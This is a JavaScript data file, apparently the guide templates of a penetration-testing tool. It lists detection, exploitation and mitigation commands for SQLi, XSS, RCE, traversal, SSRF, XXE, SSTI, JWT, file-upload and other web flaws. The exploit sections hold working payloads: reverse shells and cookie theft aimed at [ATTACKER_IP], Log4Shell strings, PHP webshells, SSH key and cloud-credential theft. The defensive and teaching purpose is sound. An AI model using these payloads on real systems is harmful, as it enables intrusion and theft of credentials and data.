// Ported from src/data/guideTemplates.js
const GUIDES = {
  sqli: {
    name: 'SQL Injection (SQLi)',
    detect: [
      { t: 'Manual Quote Test', b: "Append ' to parameters and look for SQL errors.", cmd: `curl -s "[TARGET_URL]?id=1'" | grep -iE "sql|error|syntax|ORA-"` },
      { t: 'sqlmap Full Scan', b: 'Automated SQLi detection.', cmd: 'sqlmap -u "[TARGET_URL]?id=1" --dbs --batch --level=3 --risk=2 --random-agent' },
      { t: 'sqlmap POST Request', b: 'Test POST body parameters.', cmd: `sqlmap -u "[TARGET_URL]/login" --data="user=admin&pass=test" --dbs --batch` },
      { t: 'Nmap HTTP-SQLi Script', b: 'Quick Nmap NSE checks.', cmd: 'nmap --script http-sql-injection -p 80,443 [TARGET_HOST]' },
      { t: 'Burp Suite Intruder', b: 'Use Burp Intruder with SQLi payload lists to fuzz parameters.' },
    ],
    exploit: [
      { t: 'Boolean-Based Blind', b: 'Infer data via true/false responses.', cmd: 'curl "[TARGET_URL]?id=1 AND 1=1--" && curl "[TARGET_URL]?id=1 AND 1=2--"' },
      { t: 'UNION-Based Extraction', b: 'Extract usernames/passwords via UNION SELECT.', cmd: `curl "[TARGET_URL]?id=-1 UNION SELECT null,username,password,null FROM users--"` },
      { t: 'Time-Based Blind', b: 'Confirm injection via response delay (MySQL).', cmd: `curl -o /dev/null -w "%{time_total}" "[TARGET_URL]?id=1 AND SLEEP(5)--"` },
      { t: 'MySQL File Read', b: 'Read server files if DB user has FILE privilege.', cmd: `curl "[TARGET_URL]?id=1 UNION SELECT LOAD_FILE('/etc/passwd'),null,null--"` },
      { t: 'sqlmap Full Dump', b: 'Dump all tables after confirming injection.', cmd: 'sqlmap -u "[TARGET_URL]?id=1" --dump-all --batch --threads=5' },
    ],
    mitigate: [
      { t: 'Parameterized Queries', b: 'Use prepared statements — never concatenate user input into SQL.' },
      { t: 'ORM Usage', b: 'Use an ORM (SQLAlchemy, Hibernate, ActiveRecord) that handles parameterization.' },
      { t: 'Input Allowlisting', b: 'Validate and allowlist expected formats server-side.' },
      { t: 'WAF Rule (ModSecurity)', b: 'Block SQLi patterns at the edge.', cmd: `SecRule ARGS "@detectSQLi" "id:1001,phase:2,deny,msg:'SQLi Attempt'"` },
      { t: 'Least-Privilege DB User', b: 'App DB accounts should only have SELECT/INSERT/UPDATE — never DROP or FILE.' },
    ],
    resources: ['https://owasp.org/www-community/attacks/SQL_Injection','https://portswigger.net/web-security/sql-injection','https://github.com/sqlmapproject/sqlmap'],
  },

  xss: {
    name: 'Cross-Site Scripting (XSS)',
    detect: [
      { t: 'Reflected XSS Probe', b: 'Inject a probe string and check if it returns unescaped.', cmd: 'curl -s "[TARGET_URL]?q=XSS_PROBE_12345" | grep "XSS_PROBE_12345"' },
      { t: 'dalfox XSS Scanner', b: 'Fast automated XSS scanner.', cmd: 'dalfox url "[TARGET_URL]?q=test" --silence' },
      { t: 'XSStrike', b: 'Context-aware XSS scanner.', cmd: 'python3 xsstrike.py -u "[TARGET_URL]?q=test" --crawl' },
      { t: 'DOM XSS Inspection', b: 'Check browser DevTools for unsafe innerHTML/eval assignments.' },
    ],
    exploit: [
      { t: 'Basic Alert PoC', b: 'Minimal reflected XSS payload.', cmd: '[TARGET_URL]?input=<script>alert(document.domain)</script>' },
      { t: 'img onerror', b: 'Bypass <script> tag filters.', cmd: '[TARGET_URL]?input=<img src=x onerror=alert(document.domain)>' },
      { t: 'Cookie Theft (Stored)', b: 'Stored XSS exfiltrating session cookie.', cmd: `<img src=x onerror="fetch('http://[ATTACKER_IP]/steal?c='+btoa(document.cookie))">` },
    ],
    mitigate: [
      { t: 'Output Encoding', b: 'HTML-encode all user-controlled output. Use DOMPurify for rich-text.' },
      { t: 'Content Security Policy', b: 'Strict CSP header to block inline scripts.', cmd: `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'` },
      { t: 'HttpOnly Cookies', b: 'Prevent JS cookie access.', cmd: 'Set-Cookie: session=TOKEN; HttpOnly; Secure; SameSite=Strict' },
    ],
    resources: ['https://owasp.org/www-community/attacks/xss/','https://portswigger.net/web-security/cross-site-scripting','https://github.com/hahwul/dalfox'],
  },

  rce: {
    name: 'Remote Code Execution (RCE)',
    detect: [
      { t: 'JNDI OOB Canary', b: 'Detect Log4j/JNDI blind RCE via DNS callback.', cmd: `curl -H 'X-Api-Version: \${jndi:ldap://[BURP_COLLAB]/a}' [TARGET_URL]` },
      { t: 'Time-Based Blind', b: 'Inject sleep() to detect blind RCE.', cmd: 'curl -d "param=;sleep+5;" [TARGET_URL]' },
      { t: 'nuclei CVE Templates', b: 'Run nuclei with CVE-specific templates.', cmd: 'nuclei -u [TARGET_URL] -t cves/ -severity critical,high' },
    ],
    exploit: [
      { t: 'Log4Shell (CVE-2021-44228)', b: 'JNDI LDAP payload in HTTP headers.', cmd: `curl -H 'User-Agent: \${jndi:ldap://[ATTACKER_IP]:1389/Exploit}' http://[TARGET_URL]` },
      { t: 'Bash Reverse Shell', b: 'Standard bash reverse shell payload.', cmd: `nc -lvnp 4444\ncurl -d 'cmd=bash -c "bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1"' http://[TARGET_URL]` },
      { t: 'msfvenom Payload', b: 'Generate a custom Metasploit payload.', cmd: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=4444 -f elf > shell.elf` },
    ],
    mitigate: [
      { t: 'Apply Vendor Patch', b: 'Upgrade the affected library/component immediately.' },
      { t: 'Disable JNDI (Log4j)', b: 'JVM flag for Log4j 2.10-2.14.', cmd: '-Dlog4j2.formatMsgNoLookups=true' },
      { t: 'Input Sanitization', b: 'Never pass user input to system(), exec(), eval().' },
      { t: 'Egress Firewall', b: 'Block outbound connections from app servers to prevent callbacks.' },
    ],
    resources: ['https://www.cisa.gov/known-exploited-vulnerabilities-catalog','https://github.com/fullhunt/log4j-scan','https://github.com/projectdiscovery/nuclei'],
  },

  traversal: {
    name: 'Path / Directory Traversal',
    detect: [
      { t: 'Manual Traversal Test', b: 'Inject ../ sequences into file parameters.', cmd: 'curl "[TARGET_URL]?file=../../../etc/passwd"' },
      { t: 'URL-Encoded Variants', b: 'Try double-encoded sequences.', cmd: 'curl "[TARGET_URL]?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"' },
      { t: 'ffuf Path Fuzzing', b: 'Fuzz path parameters with a traversal wordlist.', cmd: 'ffuf -u "[TARGET_URL]?page=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200' },
    ],
    exploit: [
      { t: 'Linux /etc/passwd', b: 'Read system user list.', cmd: 'curl "[TARGET_URL]?file=../../../../etc/passwd"' },
      { t: 'SSH Private Key', b: 'Extract SSH keys if accessible.', cmd: 'curl "[TARGET_URL]?file=../../../../root/.ssh/id_rsa"' },
      { t: 'App Config Files', b: 'Read application configuration with credentials.', cmd: `curl "[TARGET_URL]?file=../../../../var/www/html/.env"` },
    ],
    mitigate: [
      { t: 'Canonicalize Paths', b: 'Use realpath/canonicalize and verify it starts with allowed base dir.' },
      { t: 'Allowlist File Names', b: 'Never build paths dynamically from user input. Use allowlists.' },
      { t: 'Chroot / Container', b: 'Run the application in a chroot jail or container.' },
    ],
    resources: ['https://owasp.org/www-community/attacks/Path_Traversal','https://portswigger.net/web-security/file-path-traversal'],
  },

  lfi: {
    name: 'Local File Inclusion (LFI)',
    detect: [
      { t: 'Basic LFI Test', b: 'Test page parameters with traversal.', cmd: 'curl "[TARGET_URL]?page=../../../etc/passwd"' },
      { t: 'PHP Filter Wrapper', b: 'Extract base64-encoded PHP source.', cmd: 'curl "[TARGET_URL]?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d' },
      { t: 'wfuzz LFI Fuzzing', b: 'Fuzz LFI with wfuzz.', cmd: 'wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "[TARGET_URL]?page=FUZZ" --hc 404' },
    ],
    exploit: [
      { t: 'Credential Disclosure', b: 'Read config files with credentials.', cmd: `curl "[TARGET_URL]?page=../../../../etc/mysql/my.cnf"` },
      // eslint-disable-next-line no-useless-escape
      { t: 'Log Poisoning → RCE', b: 'Inject PHP into access log, then include it.', cmd: `curl -H "User-Agent: <?php system(\$_GET['c']); ?>" [TARGET_URL]\ncurl "[TARGET_URL]?page=../../../../var/log/apache2/access.log&c=id"` },
    ],
    mitigate: [
      { t: 'Disable PHP Wrappers', b: 'Restrict dangerous PHP wrappers.', cmd: 'allow_url_fopen = Off\nallow_url_include = Off' },
      { t: 'open_basedir Restriction', b: 'Restrict PHP file access.', cmd: 'open_basedir = /var/www/html:/tmp' },
    ],
    resources: ['https://book.hacktricks.xyz/pentesting-web/file-inclusion'],
  },

  cmdinj: {
    name: 'OS Command Injection',
    detect: [
      { t: 'Semicolon Test', b: 'Append OS commands after delimiters.', cmd: 'curl "[TARGET_URL]?host=127.0.0.1;id"' },
      { t: 'Time-Based Blind', b: 'Measure delay to detect blind injection.', cmd: 'curl -s -o /dev/null -w "%{time_total}" "[TARGET_URL]?input=;sleep+5"' },
      { t: 'commix Scanner', b: 'Comprehensive command injection tester.', cmd: 'commix --url="[TARGET_URL]?param=INJECT_HERE" --os-cmd="id" --batch' },
    ],
    exploit: [
      { t: 'Direct File Read', b: 'Read sensitive files via injected commands.', cmd: 'curl "[TARGET_URL]?host=127.0.0.1;cat+/etc/passwd"' },
      { t: 'Reverse Shell', b: 'Spawn interactive shell.', cmd: `nc -lvnp 4444\ncurl "[TARGET_URL]?host=;bash+-c+'bash+-i+>%26+/dev/tcp/[ATTACKER_IP]/4444+0>%261'"` },
    ],
    mitigate: [
      { t: 'Avoid Shell Functions', b: 'Never pass user input to shell_exec, system, exec, subprocess(shell=True).' },
      { t: 'Argument Escaping', b: 'Escape when shell calls are unavoidable.', cmd: '# Python: shlex.quote(user_input)\n# PHP: escapeshellarg($input)' },
    ],
    resources: ['https://owasp.org/www-community/attacks/Command_Injection','https://portswigger.net/web-security/os-command-injection'],
  },

  deser: {
    name: 'Insecure Deserialization',
    detect: [
      { t: 'Identify Serialized Data', b: 'Look for Java AC ED magic bytes, PHP O: strings, base64 pickle in cookies.', cmd: 'echo "[COOKIE_VALUE]" | base64 -d | xxd | head -4' },
      { t: 'ysoserial OOB Canary', b: 'Generate DNS-callback canary payload.', cmd: 'java -jar ysoserial.jar CommonsCollections1 "curl http://[BURP_COLLAB]" > canary.ser' },
    ],
    exploit: [
      { t: 'Java ysoserial RCE', b: 'Send gadget chain payload to Java deserialization endpoint.', cmd: `java -jar ysoserial.jar CommonsCollections1 'curl http://[ATTACKER_IP]/pwned' > payload.ser\ncurl -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.ser [TARGET_URL]` },
      { t: 'PHPGGC Gadget Chains', b: 'Generate PHP deserialization gadget chains.', cmd: './phpggc -l\n./phpggc Laravel/RCE1 system id | base64' },
    ],
    mitigate: [
      { t: 'Avoid Native Deser', b: 'Do not deserialize untrusted data using native serialization. Use JSON.' },
      { t: 'HMAC Signature', b: 'Sign serialized blobs server-side; verify before deserializing.' },
    ],
    resources: ['https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data','https://github.com/frohoff/ysoserial'],
  },

  ssrf: {
    name: 'Server-Side Request Forgery (SSRF)',
    detect: [
      { t: 'Basic SSRF Probe', b: 'Point a URL parameter at Burp Collaborator / interactsh.', cmd: `curl "[TARGET_URL]?url=http://[BURP_COLLAB]"` },
      { t: 'Cloud Metadata Probe', b: 'Test access to AWS EC2 IMDS endpoint.', cmd: `curl "[TARGET_URL]?url=http://169.254.169.254/latest/meta-data/"` },
      { t: 'ssrfmap Tool', b: 'Automated SSRF exploitation.', cmd: 'python3 ssrfmap.py -r request.txt -p url -m readfiles' },
    ],
    exploit: [
      { t: 'AWS Metadata Credential Theft', b: 'Steal IAM credentials via IMDS.', cmd: `curl "[TARGET_URL]?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]"` },
      { t: 'File Read via file://', b: 'If file:// is allowed, read local files.', cmd: `curl "[TARGET_URL]?url=file:///etc/passwd"` },
    ],
    mitigate: [
      { t: 'Allowlist Destination URLs', b: 'Only allow requests to a strict allowlist of domains/IPs.' },
      { t: 'Block Internal Ranges', b: 'Deny requests to 169.254.x.x, 10.x, 172.16-31.x, 192.168.x.x.' },
      { t: 'IMDSv2 (AWS)', b: 'Enforce IMDSv2 (token-based) to mitigate SSRF-based metadata theft.', cmd: 'aws ec2 modify-instance-metadata-options --instance-id [ID] --http-tokens required' },
    ],
    resources: ['https://portswigger.net/web-security/ssrf','https://github.com/swisskyrepo/SSRFmap'],
  },

  xxe: {
    name: 'XML External Entity (XXE) Injection',
    detect: [
      { t: 'Basic XXE Probe', b: 'Send an XML payload with an external entity pointing to your server.', cmd: `curl -X POST -H "Content-Type: application/xml" \\\n  -d '<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://[BURP_COLLAB]">]><root>&xxe;</root>' \\\n  [TARGET_URL]` },
      { t: 'XXEinjector', b: 'Automated XXE exploitation tool.', cmd: 'ruby XXEinjector.rb --host=[ATTACKER_IP] --httpport=80 --file=xxe_request.txt --oob=http' },
    ],
    exploit: [
      { t: 'Local File Read', b: 'Read /etc/passwd via file:// entity.', cmd: `curl -X POST -H "Content-Type: application/xml" \\\n  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' \\\n  [TARGET_URL]` },
      { t: 'SSRF via XXE', b: 'Use XXE entity to reach internal services.', cmd: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>` },
    ],
    mitigate: [
      { t: 'Disable External Entities', b: 'Disable XXE in your XML parser.', cmd: `# Java:\ndbf.setFeature("http://xml.org/sax/features/external-general-entities", false);\n# Python lxml:\nparser = etree.XMLParser(resolve_entities=False)` },
      { t: 'Use JSON Instead', b: 'Where possible replace XML APIs with JSON to eliminate the attack surface.' },
    ],
    resources: ['https://portswigger.net/web-security/xxe','https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html'],
  },

  idor: {
    name: 'Insecure Direct Object Reference (IDOR)',
    detect: [
      { t: 'Manual ID Enumeration', b: 'Change numeric IDs, GUIDs, or Base64-encoded objects in URLs/params.', cmd: `for i in $(seq 1 20); do\n  curl -s -o /dev/null -w "ID $i: %{http_code}\\n" -b "session=[YOUR_COOKIE]" "[TARGET_URL]/api/user/$i"\ndone` },
      { t: 'ffuf IDOR Fuzzing', b: 'Fuzz object IDs for unauthorized responses.', cmd: 'ffuf -u "[TARGET_URL]/api/invoice/FUZZ" -w ids.txt -H "Cookie: session=[COOKIE]" -mc 200' },
    ],
    exploit: [
      { t: 'Access Other User Data', b: "Read another user's profile/orders.", cmd: `curl -b "session=[ATTACKER_SESSION]" "[TARGET_URL]/api/users/456/profile"` },
      { t: 'Mass Data Harvesting', b: 'Enumerate all IDs to harvest PII at scale.', cmd: `seq 1 1000 | xargs -P10 -I{} curl -s -b "session=[COOKIE]" "[TARGET_URL]/api/user/{}/data" -o /tmp/user_{}.json` },
    ],
    mitigate: [
      { t: 'Server-Side Authorization', b: 'Verify every request: does the authenticated user own this resource?' },
      { t: 'Use Indirect References', b: 'Map internal IDs to random tokens per-user session. Never expose DB IDs.' },
    ],
    resources: ['https://portswigger.net/web-security/access-control/idor'],
  },

  redirect: {
    name: 'Open Redirect',
    detect: [
      { t: 'Manual Redirect Test', b: 'Replace redirect parameter values with an external domain.', cmd: `curl -I "[TARGET_URL]?next=https://evil.com"` },
      { t: 'Common Redirect Params', b: 'Fuzz common redirect parameter names.', cmd: `for p in next url redirect return to goto continue; do\n  curl -I -s "[TARGET_URL]?$p=https://evil.com" | grep -i location\ndone` },
    ],
    exploit: [
      { t: 'Phishing via Redirect', b: 'Craft a link from a trusted domain that redirects to a phishing page.', cmd: `https://[TRUSTED_TARGET_HOST]/redirect?url=https://phishing.attacker.io/login` },
      { t: 'OAuth Token Theft', b: 'If redirect_uri is validated loosely, steal OAuth tokens.' },
    ],
    mitigate: [
      { t: 'Allowlist Redirect URLs', b: 'Only permit redirects to an explicit allowlist of trusted domains.' },
      { t: 'Relative URLs Only', b: 'Accept only relative paths (starting with /) for redirect targets.' },
    ],
    resources: ['https://portswigger.net/web-security/dom-based/open-redirection','https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html'],
  },

  ssti: {
    name: 'Server-Side Template Injection (SSTI)',
    detect: [
      { t: 'Polyglot Probe', b: 'Inject the universal SSTI polyglot to trigger errors.', cmd: `curl -s "[TARGET_URL]?name={{7*7}}" | grep 49\ncurl -s "[TARGET_URL]?name=\${7*7}" | grep 49` },
      { t: 'tplmap Scanner', b: 'Automated SSTI detection.', cmd: 'python3 tplmap.py -u "[TARGET_URL]?name=INJECT" --engine Jinja2' },
      { t: 'Engine Fingerprinting', b: 'Use engine-specific math to identify the template engine.', cmd: `# Jinja2/Twig: {{7*7}} → 49\n# Freemarker: \${7*7} → 49\n# Smarty: {7*7} → 49` },
    ],
    exploit: [
      { t: 'Jinja2 RCE (Python)', b: 'Jinja2 sandbox escape to execute OS commands.', cmd: `curl -s "[TARGET_URL]?name={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"` },
      { t: 'tplmap Auto Exploit', b: 'Use tplmap to automatically exploit SSTI.', cmd: 'python3 tplmap.py -u "[TARGET_URL]?name=INJECT" --os-shell' },
    ],
    mitigate: [
      { t: 'Never Render User Input', b: 'Never pass user-controlled strings directly to template render() calls.' },
      { t: 'Use Logic-less Templates', b: 'Switch to logic-less engines (Mustache, Handlebars) with no code execution primitives.' },
    ],
    resources: ['https://portswigger.net/web-security/server-side-template-injection','https://github.com/epinna/tplmap'],
  },

  jwt: {
    name: 'JWT Vulnerabilities',
    detect: [
      { t: 'Decode & Inspect JWT', b: 'Decode the JWT without verification to inspect claims.', cmd: `echo "[JWT_HEADER]" | base64 -d\necho "[JWT_PAYLOAD]" | base64 -d\n# Or: python3 jwt_tool.py [JWT_TOKEN]` },
      { t: 'Check Algorithm: none', b: 'Test if the server accepts unsigned JWTs.', cmd: `python3 jwt_tool.py [JWT_TOKEN] -X a` },
      { t: 'Brute-Force HS256 Secret', b: 'Crack the HMAC secret with hashcat.', cmd: `hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt` },
    ],
    exploit: [
      { t: 'Algorithm Confusion (none)', b: "Set alg to 'none' and remove the signature.", cmd: `python3 jwt_tool.py [JWT_TOKEN] -X a` },
      { t: 'RS256 → HS256 Confusion', b: 'Switch to HS256 signing with the public key as the HMAC secret.', cmd: `python3 jwt_tool.py [JWT_TOKEN] -X k -pk public.pem` },
      { t: 'Forge Admin Claims', b: 'Mint a token with elevated roles after recovering the secret.', cmd: `python3 jwt_tool.py [JWT_TOKEN] -T` },
    ],
    mitigate: [
      { t: 'Enforce Strict Algorithm', b: 'Hardcode the expected algorithm server-side. Never read alg from the token.', cmd: `jwt.verify(token, secret, { algorithms: ['HS256'] })` },
      { t: 'Short Expiry + Rotation', b: 'Set exp to ≤ 15 minutes for sensitive operations.' },
    ],
    resources: ['https://portswigger.net/web-security/jwt','https://github.com/ticarpi/jwt_tool'],
  },

  csrf: {
    name: 'Cross-Site Request Forgery (CSRF)',
    detect: [
      { t: 'Check CSRF Token Presence', b: 'Inspect state-changing requests for CSRF tokens.', cmd: `curl -c cookies.txt -b cookies.txt -s "[TARGET_URL]/dashboard" | grep -i "csrf\\|_token\\|nonce"` },
      { t: 'Remove CSRF Token', b: 'Delete the CSRF token and check if the server still processes it.', cmd: `curl -b "session=[COOKIE]" -X POST "[TARGET_URL]/change-email" -d "email=attacker@evil.com"` },
    ],
    exploit: [
      { t: 'HTML Form Auto-Submit', b: 'Host a malicious page that auto-submits a form on load.', cmd: `<html><body onload="document.forms[0].submit()">\n<form action="https://[TARGET_URL]/change-email" method="POST">\n  <input name="email" value="attacker@evil.com">\n</form></body></html>` },
    ],
    mitigate: [
      { t: 'SameSite Cookie Attribute', b: 'Set SameSite=Strict or SameSite=Lax on all session cookies.', cmd: 'Set-Cookie: session=TOKEN; SameSite=Strict; Secure; HttpOnly' },
      { t: 'Synchronizer Token Pattern', b: 'Generate a unique, unpredictable CSRF token per session.' },
    ],
    resources: ['https://portswigger.net/web-security/csrf','https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html'],
  },

  fileupload: {
    name: 'Malicious File Upload',
    detect: [
      { t: 'Upload PHP Webshell', b: 'Try uploading a .php file and access it directly.', cmd: `echo '<?php system($_GET["c"]); ?>' > shell.php\ncurl -F "file=@shell.php" "[TARGET_URL]/upload"\ncurl "[TARGET_URL]/uploads/shell.php?c=id"` },
      { t: 'Extension Bypass Test', b: 'Try double extensions and mixed case.', cmd: `for ext in .php .php5 .phtml .pHp .php.jpg; do\n  cp shell.php "shell$ext"\n  curl -F "file=@shell$ext" "[TARGET_URL]/upload"\ndone` },
      { t: 'Magic Bytes Bypass', b: 'Prepend GIF89a; magic bytes to a PHP shell.', cmd: `printf 'GIF89a;<?php system($_GET["c"]); ?>' > polyglot.php.gif\ncurl -F "file=@polyglot.php.gif" "[TARGET_URL]/upload"` },
    ],
    exploit: [
      { t: 'PHP Webshell RCE', b: 'Upload and execute a PHP webshell.', cmd: `echo '<?php system($_GET["c"]); ?>' > shell.php\ncurl -F "file=@shell.php" "[TARGET_URL]/upload"\ncurl "[TARGET_URL]/uploads/shell.php?c=whoami"` },
      { t: 'SVG XSS via Upload', b: 'Upload a malicious SVG that executes JavaScript when rendered.', cmd: `printf '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>' > xss.svg\ncurl -F "file=@xss.svg;type=image/svg+xml" "[TARGET_URL]/upload"` },
    ],
    mitigate: [
      { t: 'Allowlist Extensions', b: 'Strictly allowlist only safe file types (png, jpg, pdf).' },
      { t: 'Store Outside Web Root', b: 'Store uploads in a non-web-accessible directory.' },
      { t: 'Rename Uploaded Files', b: 'Rename files to a UUID on upload to prevent direct execution.' },
    ],
    resources: ['https://portswigger.net/web-security/file-upload','https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload'],
  },

  generic: {
    name: 'General Vulnerability',
    detect: [
      { t: 'Exploit-DB Search', b: 'Find known PoC exploit code.', cmd: 'searchsploit CVE_ID\n# https://www.exploit-db.com/search?cve=CVE_ID' },
      { t: 'nuclei CVE Scan', b: 'Run nuclei with CVE-specific templates.', cmd: 'nuclei -u [TARGET_URL] -t cves/ -id CVE_ID' },
      { t: 'Nmap Version Scan', b: 'Confirm the vulnerable service version.', cmd: 'nmap -sV --version-intensity 9 -p- -T4 [TARGET_HOST]' },
    ],
    exploit: [
      { t: 'Metasploit Module', b: 'Check for an existing Metasploit module.', cmd: 'msfconsole -q -x "search CVE_ID; exit"' },
      { t: 'Isolated Lab Reproduction', b: 'Build vulnerable Docker/VM environment to reproduce safely.', cmd: 'docker run --rm -d -p 8080:80 vulhub/[APP]:vulnerable' },
    ],
    mitigate: [
      { t: 'Apply Vendor Patch', b: 'Install security patches immediately. Subscribe to vendor advisories.' },
      { t: 'Network Segmentation', b: 'Isolate vulnerable systems from Internet and sensitive internal segments.' },
      { t: 'Threat Hunting', b: 'Use SIEM/EDR to hunt for IOCs associated with this CVE.', cmd: 'grep -i "CVE_ID" /var/log/auth.log /var/log/syslog /var/log/apache2/*.log' },
    ],
    resources: ['https://nvd.nist.gov/vuln/detail/CVE_ID','https://www.cisa.gov/known-exploited-vulnerabilities-catalog','https://www.exploit-db.com'],
  },
}

export default GUIDES
